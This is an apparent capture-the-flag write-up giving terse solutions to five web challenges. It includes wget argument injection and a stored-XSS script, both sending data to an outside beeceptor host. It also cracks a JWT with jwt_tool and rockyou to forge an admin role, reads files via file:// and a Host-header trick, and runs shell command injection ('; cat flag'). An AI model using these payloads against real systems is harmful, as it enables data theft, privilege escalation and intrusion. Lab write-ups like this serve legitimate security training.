# cstalk

Downloader-v1

1. Send some URL request. 
2. Inspect. Check placeholder which says example.com/image.jpg, meaning we can add parameters to url
3. Send URL https://scsa.ge/wp-content/uploads/2025/05/copped-5.png, resulting in inspect that says href="flag.php",  meaning we can use wget, site uses wget-tools
4. Site accepts post-file(content) and post-data (text).
5. Create mock-api server and send request https://app.beeceptor.com/console/downv1 --post-file=flag.php
6. change text instead and send https://downv1.free.beeceptor.com/downv1 --post-file=flag.p'h'p
7. Result: GET ME!
&lt;?php /* DCTF{6789af26f90396678909a99bf46ba3a78b2f1b349fbc4385e6c50556c1d0c9ff} */
?&gt;&#39; normally this would be done with shell manipulation, which beeceptor helps us avoid.

Frameble

1. Login and explore the website. Try using the search to attempt to get the flag with a script
2. <script>alert(1)</script>. Simple alert script.
3. Search doesn't work, move on to the POSTS and try to use the post upload process.
4. Post gives result meaning that it's vulnerable to "stored.xss". Use a script that will be stored on the website and will send appropriate requests from it. 
5. Create a mock API and use the script:
<script>
var exfil = document.getElementsByTagName("body")[0].innerHTML;
window.location.href="https://berkin.free.beeceptor.com/" + btoa(exfil);
<script> - this creates a variable exfil, and use btoa to return a base64-encoded version.
6. Get an encrypted text on beeceptor and decode it either using echo [code without colons] | base64 --decode
or a decoding website

under-construction

1. Create user and inspect the user profile page, finding a Vue.js and js folder
2. We can search the unreadable scripts using map. The info is likely stord in localStorage.
3. Check app.d875ddd5.js with .map: siteex.com/js/app.d875ddd5.js.map
4. We find a ROLE_ADMIN meaning that it's the system admin name. \
5. Since localStorage is being used, in console: localStorage.getItem("user")
6. We get a token which points us to having to replace user with ROLE_ADMIN and access admin board.
7. Applications->Storage->localStorage. get the accessToken and crack it using jwt_tools
8. git clone https://github.com/ticarpi/jwt_tool
9. python3 -m pip install -r requirements.txt
10. cd jwt_tool
11. python -m venv venv
12. python3 -m pip install -r requirements.txt
13. python3 jwt_tool.py -t http://34.185.167.212:31130/api/app/admin -rc “eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6OSwiaWF0IjoxNzYzNzQ3NTMwLCJleHAiOjE3NjM4MzM5MzB9.iwQ2vt-WBLPLhoV_IP3W06vZmRL4Ja9TwDqZegoRcfE" -C -d rockyou.txt
14. use jwt.io to decode, change the ID on 1.
15. Modify the token in localStorage or using a Burp request

Downloader-v1

1. Use burp and send the IP in browser, send to repeater and try to find file://etc/passwd
2. Result lets us know that main directory is /home/ctf and server is built on python.
3. Send a request on app.py. the host header is "company.ltd" based on the code
4. Change the header to company.ltd and get the flag as a result.

Ping-station

1. Try the 'ls' command and realize the search bar needs an IP.
2. Try 192.168.0.1; ls -la; using the semicolon for command separation
3. in IP enter 192.168.0.1; cat flag
